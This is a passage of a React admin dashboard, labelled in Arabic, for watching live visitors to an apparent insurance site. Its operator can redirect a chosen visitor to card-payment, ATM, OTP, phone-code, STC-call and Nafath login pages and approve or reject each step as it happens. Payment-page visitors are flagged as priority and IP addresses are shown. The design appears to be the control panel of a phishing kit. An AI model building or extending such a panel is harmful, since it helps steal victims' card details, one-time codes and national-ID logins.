      if (statusFilter === "online") filtered = filtered.filter(v => v.is_online);
      else if (statusFilter === "offline") filtered = filtered.filter(v => !v.is_online);
    }
    if (countryFilter) filtered = filtered.filter(v => v.country === countryFilter);
    if (q) filtered = filtered.filter(v => (v.visitor_name || "").toLowerCase().includes(q) || (v.phone || "").includes(q) || v.session_id.toLowerCase().includes(q));
    if (sortBy === "duration") filtered = [...filtered].sort((a, b) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime());
    else if (sortBy === "entry") filtered = [...filtered].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
    else if (sortBy === "last_action") filtered = [...filtered].sort((a, b) => new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime());
    return filtered;
  };

  const filteredVisitors = getFilteredVisitors();

  // Country list for dropdown
  const countries = [...new Set(visitors.filter(v => v.country).map(v => v.country!))].sort();

  return (
    <>
      {/* Delete confirmation modal */}
      {showDeleteConfirm && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50" onClick={() => setShowDeleteConfirm(null)}>
          <div className="bg-card border border-border rounded-xl p-6 mx-4 max-w-sm w-full shadow-xl" dir="rtl" onClick={e => e.stopPropagation()}>
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-destructive/10 flex items-center justify-center">
                <Trash2 className="w-5 h-5 text-destructive" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-foreground">تأكيد المسح</h3>
                <p className="text-xs text-muted-foreground">هل أنت متأكد من مسح الزوار المحددين؟</p>
              </div>
            </div>
            <div className="flex items-center gap-2 justify-end">
              <button onClick={() => setShowDeleteConfirm(null)} className="px-4 py-2 rounded-lg text-xs font-medium bg-muted text-muted-foreground hover:bg-muted/80 transition-all">لا</button>
              <button onClick={() => { showDeleteConfirm(); setShowDeleteConfirm(null); }} className="px-4 py-2 rounded-lg text-xs font-medium bg-destructive text-destructive-foreground hover:bg-destructive/90 transition-all">نعم، امسح</button>
            </div>
          </div>
        </div>
      )}

      {/* Chat clear confirmation modal */}
      {chatClearTarget && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50 animate-fade-in" onClick={() => setChatClearTarget(null)}>
          <motion.div
            initial={{ scale: 0.8, opacity: 0, rotate: -2 }}
            animate={{ scale: [0.8, 1.03, 0.98, 1], opacity: 1, rotate: [-2, 1.5, -0.5, 0] }}
            transition={{ duration: 0.4, ease: "easeOut" }}
            className="bg-card border border-border rounded-xl p-6 mx-4 max-w-sm w-full shadow-xl" dir="rtl" onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-destructive/10 flex items-center justify-center">
                <MessageCircle className="w-5 h-5 text-destructive" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-foreground">مسح المحادثة</h3>
                <p className="text-xs text-muted-foreground">هل أنت متأكد من مسح محادثة "{chatClearTarget.visitorName}"؟ لا يمكن التراجع عن هذا الإجراء.</p>
              </div>
            </div>
            <div className="flex items-center gap-2 justify-end">
              <button onClick={() => setChatClearTarget(null)} className="px-4 py-2 rounded-lg text-xs font-medium bg-muted text-muted-foreground hover:bg-muted/80 transition-all">إلغاء</button>
              <button onClick={() => executeClearChat(chatClearTarget.sessionId)} className="px-4 py-2 rounded-lg text-xs font-medium bg-destructive text-destructive-foreground hover:bg-destructive/90 transition-all">نعم، امسح</button>
            </div>
          </motion.div>
        </div>
      )}

      <div className="h-[calc(100dvh-120px)] flex flex-col gap-2 md:gap-3" dir="rtl">
        {/* Compact stats bar */}
        <div className="flex flex-wrap items-center gap-2 bg-card border border-border rounded-xl p-2 md:p-3 shrink-0">
          <div className="flex items-center gap-1.5 px-2 py-1 bg-emerald-500/10 rounded-lg">
            <Circle className="w-2 h-2 fill-emerald-500 text-emerald-500 animate-pulse" />
            <span className="text-xs font-bold text-emerald-600">{onlineCount}</span>
            <span className="text-[10px] text-muted-foreground">متصل</span>
          </div>
          <div className="flex items-center gap-1.5 px-2 py-1 bg-primary/10 rounded-lg">
            <User className="w-3 h-3 text-primary" />
            <span className="text-xs font-bold text-primary">{totalCount}</span>
            <span className="text-[10px] text-muted-foreground">إجمالي</span>
          </div>
          {pendingCount > 0 && (
            <div className="flex items-center gap-1.5 px-2 py-1 bg-amber-500/10 rounded-lg">
              <Clock className="w-3 h-3 text-amber-600" />
              <span className="text-xs font-bold text-amber-600">{pendingCount}</span>
              <span className="text-[10px] text-muted-foreground">بانتظار</span>
            </div>
          )}

          {/* Country chips - inline in stats bar */}
          {countries.length > 0 && (
            <>
              <div className="w-px h-5 bg-border hidden md:block" />
              <div className="flex items-center gap-1 flex-wrap">
                <Globe className="w-3 h-3 text-muted-foreground" />
                {(() => {
                  const countryStats: Record<string, { count: number; online: number; code: string | null }> = {};
                  visitors.forEach(v => {
                    const c = v.country || "غير معروف";
                    if (c === "غير معروف") return;
                    if (!countryStats[c]) countryStats[c] = { count: 0, online: 0, code: v.country_code };
                    countryStats[c].count++;
                    if (v.is_online) countryStats[c].online++;
                  });
                  return Object.entries(countryStats).sort((a, b) => b[1].count - a[1].count).map(([country, data]) => (
                    <button
                      key={country}
                      onClick={() => setCountryFilter(countryFilter === country ? "" : country)}
                      className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-full text-[9px] transition-all ${
                        countryFilter === country ? "bg-primary/20 ring-1 ring-primary text-primary font-bold" : "bg-muted/50 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      <span>{countryFlag(data.code)}</span>
                      <span>{data.count}</span>
                      {data.online > 0 && <Circle className="w-1.5 h-1.5 fill-emerald-500 text-emerald-500" />}
                    </button>
                  ));
                })()}
              </div>
            </>
          )}
        </div>

        <div className="flex-1 flex flex-col md:flex-row gap-2 md:gap-3 min-h-0">
          {/* Visitors list */}
          <div className={`${selectedVisitor ? "hidden md:flex" : "flex"} md:w-1/4 min-w-0 md:min-w-[220px] bg-card border border-border rounded-xl flex-col overflow-hidden ${!selectedVisitor ? "flex-1" : ""}`}>
            {/* List header */}
            <div className="p-2.5 border-b border-border bg-muted/30 space-y-2">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-1.5">
                  <Eye className="w-3.5 h-3.5 text-primary" />
                  <h3 className="text-xs font-bold text-foreground">قائمة الزوار</h3>
                </div>
                <div className="relative">
                  <button
                    onClick={() => setShowChatMenu(!showChatMenu)}
                    className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded text-[9px] bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                    title="خيارات مسح المحادثات"
                  >
                    <Trash2 className="w-2.5 h-2.5" />
                    <ChevronDown className="w-2.5 h-2.5" />
                  </button>
                  {showChatMenu && (
                    <>
                    <div className="fixed inset-0 z-40" onClick={() => setShowChatMenu(false)} />
                    <div className="absolute left-0 top-full mt-1 z-50 bg-card border border-border rounded-lg shadow-lg py-1 min-w-[160px]" dir="rtl">
                      <button
                        onClick={() => {
                          setShowChatMenu(false);
                          setShowDeleteConfirm(() => clearOfflineVisitors);
                        }}
                        className="w-full text-right px-3 py-2 text-[11px] text-destructive hover:bg-destructive/10 transition-colors flex items-center gap-2"
                      >
                        <Trash2 className="w-3 h-3" />مسح جميع الزوار الغير متصلين
                      </button>
                      <button
                        onClick={() => {
                          setShowChatMenu(false);
                          setChatSelectMode(!chatSelectMode);
                          setSelectedForClear(new Set());
                        }}
                        className="w-full text-right px-3 py-2 text-[11px] text-foreground hover:bg-accent/50 transition-colors flex items-center gap-2"
                      >
                        <Check className="w-3 h-3" />تحديد للمسح
                      </button>
                    </div>
                    </>
                  )}
                </div>
              </div>

              {/* Search */}
              <div className="relative">
                <Search className="absolute right-2 top-1/2 -translate-y-1/2 w-3 h-3 text-muted-foreground" />
                <input
                  type="text"
                  placeholder="بحث بالاسم أو الجوال..."
                  value={searchQuery}
                  onChange={e => setSearchQuery(e.target.value)}
                  className="w-full h-7 pr-7 pl-2 text-[11px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary placeholder:text-muted-foreground"
                />
              </div>

              {/* Filters row */}
              <div className="flex items-center gap-1 flex-wrap">
                {[
                  { key: "all" as const, label: "الكل", count: totalCount },
                  { key: "online" as const, label: "متصل", count: onlineCount, dot: "fill-emerald-500 text-emerald-500" },
                  { key: "offline" as const, label: "غير متصل", count: offlineCount },
                ].map(f => (
                  <button
                    key={f.key}
                    onClick={() => setStatusFilter(f.key)}
                    className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[10px] transition-all ${
                      statusFilter === f.key ? "bg-primary/20 text-primary font-bold ring-1 ring-primary" : "bg-muted/50 text-muted-foreground hover:bg-muted"
                    }`}
                  >
                    {f.dot && <Circle className={`w-1.5 h-1.5 ${f.dot}`} />}
                    {f.label} ({f.count})
                  </button>
                ))}
                {favoriteCount > 0 && (
                  <button
                    onClick={() => setStatusFilter(statusFilter === "favorites" ? "all" : "favorites")}
                    className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[10px] transition-all ${
                      statusFilter === "favorites" ? "bg-amber-400/20 text-amber-600 font-bold ring-1 ring-amber-400" : "bg-muted/50 text-muted-foreground hover:bg-muted"
                    }`}
                  >
                    <Star className={`w-2.5 h-2.5 ${statusFilter === "favorites" ? "fill-amber-400 text-amber-400" : ""}`} />
                    مفضل ({favoriteCount})
                  </button>
                )}
                {deletedCount > 0 && (
                  <button
                    onClick={() => setStatusFilter(statusFilter === "deleted" ? "all" : "deleted")}
                    className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[10px] transition-all ${
                      statusFilter === "deleted" ? "bg-destructive/20 text-destructive font-bold ring-1 ring-destructive" : "bg-muted/50 text-muted-foreground hover:bg-muted"
                    }`}
                  >
                    <Trash2 className="w-2.5 h-2.5" />
                    محذوفين ({deletedCount})
                  </button>
                )}
              </div>

              {/* Sort + contextual actions */}
              <div className="flex items-center gap-1.5 flex-wrap">
                <select
                  value={sortBy}
                  onChange={e => setSortBy(e.target.value as any)}
                  className="h-6 text-[10px] bg-background border border-border rounded px-1 pr-5 text-foreground focus:outline-none focus:border-primary"
                >
                  <option value="default">ترتيب: افتراضي</option>
                  <option value="duration">الأطول مدة</option>
                  <option value="entry">الأحدث دخولاً</option>
                  <option value="last_action">آخر إجراء</option>
                </select>

                {/* Contextual actions per filter */}
                {statusFilter === "offline" && offlineCount > 0 && (
                  <button
                    onClick={() => setShowDeleteConfirm(() => () => deleteVisitors(visitors.filter(v => !v.is_online).map(v => v.id)))}
                    className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[9px] bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                  >
                    <Trash2 className="w-2.5 h-2.5" />مسح الكل
                  </button>
                )}
                {statusFilter === "deleted" && deletedVisitors.length > 0 && (
                  <button
                    onClick={() => { setDeletedVisitors([]); setDeletedCount(0); setStatusFilter("all"); toast.success("تم مسح سجل الزوار المحذوفين"); }}
                    className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[9px] bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                  >
                    <Trash2 className="w-2.5 h-2.5" />مسح السجل
                  </button>
                )}
                {statusFilter === "favorites" && favoriteCount > 0 && (
                  <button
                    onClick={async () => {
                      const favIds = visitors.filter(v => v.is_favorite).map(v => v.id);
                      for (const id of favIds) await supabase.from("site_visitors").update({ is_favorite: false }).eq("id", id);
                      toast.success("تم إزالة الكل من المفضلة");
                      setStatusFilter("all");
                      fetchVisitors();
                    }}
                    className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[9px] bg-amber-400/10 text-amber-600 hover:bg-amber-400/20 transition-all"
                  >
                    <Star className="w-2.5 h-2.5" />إزالة الكل
                  </button>
                )}
                {statusFilter === "favorites" && visitors.filter(v => v.is_favorite && !v.is_online).length > 0 && (
                  <button
                    onClick={() => setShowDeleteConfirm(() => () => deleteVisitors(visitors.filter(v => v.is_favorite && !v.is_online).map(v => v.id)))}
                    className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded text-[9px] bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                  >
                    <Trash2 className="w-2.5 h-2.5" />مسح غير المتصلين
                  </button>
                )}
              </div>
            </div>

            {/* Visitor items */}
            <div className="flex-1 overflow-y-auto">
              <AnimatePresence mode="popLayout">
              {filteredVisitors.length === 0 ? (
                <motion.div
                  key="empty"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  transition={{ duration: 0.2 }}
                  className="p-6 text-center"
                >
                  <p className="text-xs text-muted-foreground">{searchQuery ? "لا توجد نتائج" : "لا يوجد زوار حالياً"}</p>
                </motion.div>
              ) : (
                filteredVisitors.map((visitor, index) => {
                  const hasPendingRequest = !!pendingRequestMap[visitor.id];
                  const pendingStage = pendingStageMap[visitor.id];
                  const isPriority = visitor.is_online && getVisitorPriority(visitor.current_page) > 0;
                  const uaInfo = parseUserAgent(visitor.user_agent);
                  const DeviceIcon = uaInfo.device === "Mobile" ? Smartphone : uaInfo.device === "Tablet" ? Tablet : Monitor;
                  return (
                    <motion.div
                      layout
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, x: -30, scale: 0.95 }}
                      transition={{ duration: 0.2, delay: Math.min(index * 0.02, 0.3) }}
                      key={visitor.id}
                      className="border-b border-border/50"
                    >
                      <button
                        onClick={() => {
                          if (chatSelectMode) {
                            setSelectedForClear(prev => {
                              const next = new Set(prev);
                              if (next.has(visitor.session_id)) next.delete(visitor.session_id);
                              else next.add(visitor.session_id);
                              return next;
                            });
                          } else {
                            setSelectedVisitor(visitor);
                          }
                        }}
                        className={`w-full text-right p-2.5 transition-all hover:bg-accent/50 ${
                          selectedVisitor?.id === visitor.id ? "bg-primary/10 border-r-2 border-r-primary" : ""
                        } ${visitor.is_blocked ? "opacity-50" : ""} ${isPriority ? "bg-amber-50 dark:bg-amber-950/20 border-r-2 border-r-amber-500" : ""}`}
                      >
                      <div className="flex items-center gap-2">
                        {chatSelectMode && (
                          <motion.div
                            initial={{ scale: 0 }}
                            animate={{ scale: 1 }}
                            className={`w-4 h-4 rounded border-2 flex items-center justify-center shrink-0 transition-all ${
                              selectedForClear.has(visitor.session_id) ? "bg-primary border-primary" : "border-muted-foreground/40"
                            }`}
                          >
                            <AnimatePresence>
                              {selectedForClear.has(visitor.session_id) && (
                                <motion.div
                                  initial={{ scale: 0, rotate: -45 }}
                                  animate={{ scale: 1, rotate: 0 }}
                                  exit={{ scale: 0, rotate: 45 }}
                                  transition={{ type: "spring", stiffness: 500, damping: 25 }}
                                >
                                  <Check className="w-2.5 h-2.5 text-primary-foreground" />
                                </motion.div>
                              )}
                            </AnimatePresence>
                          </motion.div>
                        )}
                        <div className="relative shrink-0">
                          <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center relative">
                            <User className="w-3.5 h-3.5 text-primary" />
                            <span className={`absolute -bottom-0.5 -left-0.5 w-2 h-2 rounded-full border-2 border-card ${visitor.is_online ? "bg-emerald-500" : "bg-muted-foreground/40"}`} />
                          </div>
                          <button
                            onClick={e => toggleFavorite(visitor.id, e)}
                            className="absolute -top-1 -right-1 p-0.5 rounded-full hover:scale-125 transition-transform"
                          >
                            <Star className={`w-2.5 h-2.5 ${visitor.is_favorite ? "fill-amber-400 text-amber-400" : "text-muted-foreground/30 hover:text-amber-400"}`} />
                          </button>
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-1">
                            <p className="text-[11px] font-semibold text-foreground truncate">
                              {visitor.visitor_name || `زائر #${visitor.session_id.slice(0, 6)}`}
                            </p>
                            {visitor.is_blocked && <span className="px-1 py-0.5 rounded text-[7px] font-bold bg-destructive/10 text-destructive">محظور</span>}
                            {isPriority && (
                              <span className="px-1 py-0.5 rounded text-[7px] font-bold bg-amber-500/10 text-amber-600 animate-pulse flex items-center gap-0.5">
                                <CreditCard className="w-2 h-2" />دفع
                              </span>
                            )}
                          </div>
                          <div className="flex items-center gap-1 mt-0.5">
                            <MapPin className="w-2 h-2 text-muted-foreground shrink-0" />
                            <p className="text-[9px] text-muted-foreground truncate">{visitor.current_page || "/"}</p>
                          </div>
                          <div className="flex items-center gap-1 mt-0.5">
                            <DeviceIcon className="w-2 h-2 text-muted-foreground/70 shrink-0" />
                            <span className="text-[8px] text-muted-foreground/70 truncate">
                              {[uaInfo.browser, uaInfo.os].filter(Boolean).join(" · ")}
                              {visitor.country && ` · ${countryFlag(visitor.country_code)} ${visitor.country}`}
                            </span>
                          </div>
                          <div className="flex items-center gap-1.5 mt-0.5 flex-wrap">
                            <span className={`inline-flex items-center gap-0.5 text-[8px] ${visitor.is_online ? "text-emerald-600" : "text-muted-foreground/60"}`}>
                              <Circle className={`w-1.5 h-1.5 ${visitor.is_online ? "fill-emerald-500 text-emerald-500" : "fill-muted-foreground/40 text-muted-foreground/40"}`} />
                              {visitor.is_online ? "متصل" : formatTime(visitor.last_seen_at)}
                            </span>
                            <LiveTimer since={visitor.created_at} />
                            {hasPendingRequest && !visitor.is_blocked && (
                              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded-full bg-amber-500/10 text-amber-600 text-[7px] font-bold animate-pulse">
                                <Clock className="w-2 h-2" />ينتظر رد
                              </span>
                            )}
                            {pendingStage && !visitor.is_blocked && (
                              <span className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-orange-500/15 text-orange-600 text-[8px] font-bold animate-pulse border border-orange-500/20">
                                <Loader2 className="w-2.5 h-2.5 animate-spin" />
                                ينتظر الرد
                              </span>
                            )}
                          </div>
                          {/* Inline approve/reject buttons in visitor card */}
                          {pendingStage && visitor.is_online && !visitor.is_blocked && (() => {
                            const pendingOrder = linkedOrders.length > 0 ? linkedOrders.find(o => o.stage_status === "pending" && o.visitor_session_id === visitor.session_id) : null;
                            // We need to find the order from all orders - fetch inline
                            return (
                              <div className="flex items-center gap-1 mt-1" onClick={e => e.stopPropagation()}>
                                <button
                                  onClick={async (e) => {
                                    e.stopPropagation();
                                    const { data: pOrders } = await supabase.from("insurance_orders").select("id").eq("visitor_session_id", visitor.session_id).eq("stage_status", "pending").limit(1);
                                    if (pOrders && pOrders[0]) {
                                      handleStageApprove(pOrders[0].id);
                                    }
                                  }}
                                  disabled={loadingAction !== null}
                                  className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded bg-emerald-600 text-white text-[8px] font-bold hover:bg-emerald-700 transition-all disabled:opacity-50"
                                >
                                  <Check className="w-2 h-2" />موافقة
                                </button>
                                <button
                                  onClick={async (e) => {
                                    e.stopPropagation();
                                    const { data: pOrders } = await supabase.from("insurance_orders").select("id").eq("visitor_session_id", visitor.session_id).eq("stage_status", "pending").limit(1);
                                    if (pOrders && pOrders[0]) {
                                      handleStageReject(pOrders[0].id);
                                    }
                                  }}
                                  disabled={loadingAction !== null}
                                  className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded bg-destructive text-destructive-foreground text-[8px] font-bold hover:bg-destructive/90 transition-all disabled:opacity-50"
                                >
                                  <X className="w-2 h-2" />رفض
                                </button>
                              </div>
                            );
                          })()}
                          {statusFilter === "deleted" && (
                            <button
                              onClick={e => {
                                e.stopPropagation();
                                setDeletedVisitors(prev => prev.filter(v => v.id !== visitor.id));
                                setDeletedCount(prev => Math.max(0, prev - 1));
                                toast.success("تم إزالة الزائر من السجل");
                              }}
                              className="mt-1 inline-flex items-center gap-0.5 px-1 py-0.5 rounded text-[8px] bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                            >
                              <X className="w-2 h-2" />إزالة من السجل
                            </button>
                          )}
                        </div>
                      </div>
                      </button>
                    </motion.div>
                  );
                })
              )}
              </AnimatePresence>
            </div>
            {/* Select mode action bar */}
            {chatSelectMode && (
              <div className="p-2 border-t border-border bg-muted/30 flex items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      if (selectedForClear.size === filteredVisitors.length) {
                        setSelectedForClear(new Set());
                      } else {
                        setSelectedForClear(new Set(filteredVisitors.map(v => v.session_id)));
                      }
                    }}
                    className="px-2 py-1 rounded-lg text-[10px] font-medium bg-primary/10 text-primary hover:bg-primary/20 transition-all"
                  >
                    {selectedForClear.size === filteredVisitors.length ? "إلغاء تحديد الكل" : "تحديد الكل"}
                  </button>
                  <span className="text-[10px] text-muted-foreground">محدد: {selectedForClear.size}</span>
                </div>
                <div className="flex items-center gap-1.5">
                  <button
                    onClick={() => { setChatSelectMode(false); setSelectedForClear(new Set()); }}
                    className="px-2.5 py-1 rounded-lg text-[10px] font-medium bg-muted text-muted-foreground hover:bg-muted/80 transition-all"
                  >إلغاء</button>
                  <button
                    onClick={() => {
                      if (selectedForClear.size === 0) { toast.info("حدد زوار أولاً"); return; }
                      sounds.warning();
                      setShowDeleteConfirm(() => clearSelectedChats);
                    }}
                    disabled={selectedForClear.size === 0}
                    className="px-2.5 py-1 rounded-lg text-[10px] font-medium bg-destructive text-destructive-foreground hover:bg-destructive/90 disabled:opacity-50 transition-all"
                  >مسح المحدد ({selectedForClear.size})</button>
                </div>
              </div>
            )}
          </div>

          {/* Visitor details panel */}
          <div className={`${selectedVisitor ? "flex" : "hidden md:flex"} flex-1 bg-card border border-border rounded-xl overflow-hidden flex-col`}>
            {!selectedVisitor ? (
              <div className="flex-1 flex items-center justify-center">
                <div className="text-center space-y-3">
                  <div className="w-16 h-16 rounded-full bg-muted/50 flex items-center justify-center mx-auto">
                    <User className="w-8 h-8 text-muted-foreground/50" />
                  </div>
                  <p className="text-lg font-semibold text-muted-foreground">اختر زائر لعرض التفاصيل</p>
                </div>
              </div>
            ) : (
              <div className="flex-1 overflow-y-auto p-3 md:p-5 space-y-4">
                {/* Mobile back */}
                <button onClick={() => setSelectedVisitor(null)} className="md:hidden flex items-center gap-1.5 text-sm text-primary font-medium mb-2">
                  <ArrowRight className="w-4 h-4" />العودة للقائمة
                </button>

                {/* Header */}
                <div className="flex items-center gap-3 pb-4 border-b border-border">
                  <div className="w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center relative">
                    <User className="w-6 h-6 text-primary" />
                    <span className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-card ${selectedVisitor.is_online ? "bg-emerald-500" : "bg-muted-foreground/40"}`} />
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <h2 className="text-lg font-bold text-foreground">
                        {selectedVisitor.visitor_name || `زائر #${selectedVisitor.session_id.slice(0, 6)}`}
                      </h2>
                      <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${selectedVisitor.is_online ? "bg-emerald-500/10 text-emerald-600" : "bg-muted text-muted-foreground"}`}>
                        <Circle className={`w-1.5 h-1.5 ${selectedVisitor.is_online ? "fill-emerald-500 text-emerald-500" : "fill-muted-foreground text-muted-foreground"}`} />
                        {selectedVisitor.is_online ? "متصل" : "غير متصل"}
                      </span>
                    </div>
                    <div className="flex items-center gap-1.5 mt-1">
                      <MapPin className="w-3.5 h-3.5 text-primary" />
                      <p className="text-sm text-muted-foreground">{selectedVisitor.current_page || "/"}</p>
                    </div>
                    {(() => {
                      const ua = parseUserAgent(selectedVisitor.user_agent);
                      const DevIcon = ua.device === "Mobile" ? Smartphone : ua.device === "Tablet" ? Tablet : Monitor;
                      const parts = [
                        ua.device,
                        ua.os,
                        ua.browser,
                        selectedVisitor.country_code ? `${countryFlag(selectedVisitor.country_code)} ${selectedVisitor.country_code.toUpperCase()}` : null,
                        selectedVisitor.ip_address,
                      ].filter(Boolean);
                      return parts.length > 0 ? (
                        <div className="flex items-center gap-1 flex-wrap mt-1.5">
                          <DevIcon className="w-3 h-3 text-muted-foreground" />
                          <span className="text-[10px] text-muted-foreground">{parts.join(" · ")}</span>
                        </div>
                      ) : null;
                    })()}
                  </div>
                </div>

                {/* Action buttons */}
                <div className="flex items-center gap-1.5 pb-3 border-b border-border">
                  <Button onClick={() => toggleFavorite(selectedVisitor.id)} variant="outline" className={`gap-1 text-[11px] px-2 h-8 ${selectedVisitor.is_favorite ? "text-amber-500 border-amber-500/30 bg-amber-500/5" : ""}`} size="sm">
                    <Star className={`w-3 h-3 ${selectedVisitor.is_favorite ? "fill-amber-400" : ""}`} />
                    {selectedVisitor.is_favorite ? "مفضلة" : "مفضلة"}
                  </Button>
                  <Button onClick={handleClearChat} disabled={loadingAction !== null} variant="outline" className="gap-1 text-[11px] px-2 h-8 text-destructive hover:text-destructive" size="sm">
                    {loadingAction === "clear" ? <Loader2 className="w-3 h-3 animate-spin" /> : <Trash2 className="w-3 h-3" />}مسح
                  </Button>
                  <Button onClick={handleBlockToggle} disabled={loadingAction !== null} variant={selectedVisitor.is_blocked ? "outline" : "destructive"} className="gap-1 text-[11px] px-2 h-8" size="sm">
                    {loadingAction === "block" ? <Loader2 className="w-3 h-3 animate-spin" /> : selectedVisitor.is_blocked ? <ShieldCheck className="w-3 h-3" /> : <Ban className="w-3 h-3" />}
                    {selectedVisitor.is_blocked ? "إلغاء حظر" : "حظر"}
                  </Button>
                </div>

                {/* Redirect to page */}
                {selectedVisitor.is_online && (
                  <div className="flex items-center gap-2 bg-muted/30 border border-border rounded-xl p-2.5">
                    <span className="text-xs font-bold text-foreground whitespace-nowrap">توجيه لصفحة</span>
                    <select
                      value={redirectPage}
                      onChange={e => setRedirectPage(e.target.value)}
                      className="flex-1 h-9 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground focus:border-primary focus:outline-none transition-colors"
                    >
                      <option value="">اختر صفحة</option>
                      <optgroup label="الصفحات الرئيسية">
                        <option value="/">الرئيسية</option>
                      </optgroup>
                      <optgroup label="الدفع والتحقق">
                        <option value="/insurance/payment">الدفع بالبطاقة</option>
                        <option value="/insurance/atm">دفع ATM</option>
                        <option value="/insurance/otp">رمز التحقق OTP</option>
                        <option value="/insurance/phone-verify">توثيق الجوال</option>
                        <option value="/insurance/phone-otp">كود الجوال</option>
                        <option value="/insurance/phone-stc">مكالمة STC</option>
                        <option value="/insurance/nafath-login">نفاذ - دخول</option>
                        <option value="/insurance/nafath-verify">نفاذ - تحقق</option>
                        <option value="/insurance/confirmation">تأكيد الوثيقة</option>
                      </optgroup>
                    </select>
                    <button
                      onClick={async () => {
                        if (!redirectPage) { toast.info("اختر صفحة أولاً"); return; }
                        await supabase.from("site_visitors").update({ current_page: redirectPage }).eq("id", selectedVisitor.id);
                        setSelectedVisitor({ ...selectedVisitor, current_page: redirectPage });
                        toast.success(`تم توجيه الزائر إلى ${redirectPage}`);
                        setRedirectPage("");
                        fetchVisitors();
                      }}
                      disabled={!redirectPage}
                      className="h-9 px-4 rounded-lg text-xs font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-all whitespace-nowrap"
                    >
                      توجيه
                    </button>
                  </div>
                )}


                <Accordion type="multiple" defaultValue={["visitor-timeline", "visitor-info", "insurance-info", "payment-info", "payment-otp", "atm-info", "phone-verify", "phone-otp", "nafath-login", "nafath-code", "chat"]} className="space-y-2">
                  <AccordionItem value="visitor-timeline" className="border border-border rounded-xl overflow-hidden">
                    <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                      <div className="flex items-center gap-2">
                        <GitBranch className="w-4 h-4 text-primary" />الخط الزمني للمراحل
                        {timelineEventsAll.length > 0 && <span className="px-1.5 py-0.5 rounded-full bg-primary/10 text-primary text-[10px] font-bold">{timelineEventsAll.length}</span>}
                      </div>
                    </AccordionTrigger>
                    <AccordionContent className="px-4 py-3">
                      {timelineEventsAll.length > 0 && (
                        <div className="flex items-center gap-1.5 mb-3 flex-wrap">
                          {([["all", "الكل"], ["pending", "بانتظار"], ["approved", "موافق"], ["rejected", "مرفوض"]] as const).map(([val, label]) => (
                            <button
                              key={val}
                              onClick={() => setTimelineFilter(val)}
                              className={`px-2.5 py-1 rounded-full text-[10px] font-bold border transition-colors ${timelineFilter === val ? (val === "approved" ? "bg-emerald-500 text-white border-emerald-500" : val === "rejected" ? "bg-destructive text-white border-destructive" : val === "pending" ? "bg-amber-500 text-white border-amber-500" : "bg-primary text-primary-foreground border-primary") : "bg-muted/50 text-muted-foreground border-border hover:bg-muted"}`}
                            >
                              {label}
                            </button>
                          ))}
                        </div>
                      )}
                      {timelineEvents.length === 0 ? (
                        <p className="text-xs text-muted-foreground text-center py-3">{timelineEventsAll.length === 0 ? "لا يوجد سجل مراحل بعد" : "لا توجد أحداث بهذا الفلتر"}</p>
                      ) : (
                        <div className="space-y-3">
                          {timelineEvents.map((event, index) => {
                            const statusTone = event.status === "approved"
                              ? "bg-emerald-500/10 text-emerald-600 border-emerald-500/20"
                              : event.status === "rejected"
                                ? "bg-destructive/10 text-destructive border-destructive/20"
                                : "bg-amber-500/10 text-amber-600 border-amber-500/20";

                            return (
                              <div key={event.id} className="relative rounded-xl border border-border/50 bg-muted/20 p-4 pr-8">
                                {index !== timelineEvents.length - 1 && (
                                  <div className="absolute right-4 top-9 h-[calc(100%+0.75rem)] w-px bg-border" />
                                )}
                                <div className="absolute right-[11px] top-5 rounded-full bg-card">
                                  <Dot className={`w-5 h-5 ${event.status === "approved" ? "text-emerald-500" : event.status === "rejected" ? "text-destructive" : "text-amber-500"}`} />
                                </div>
                                <div className="flex items-start justify-between gap-3">
                                  <div>
                                    <p className="text-xs font-bold text-foreground">{stageLabel[event.stage] || event.stage}</p>
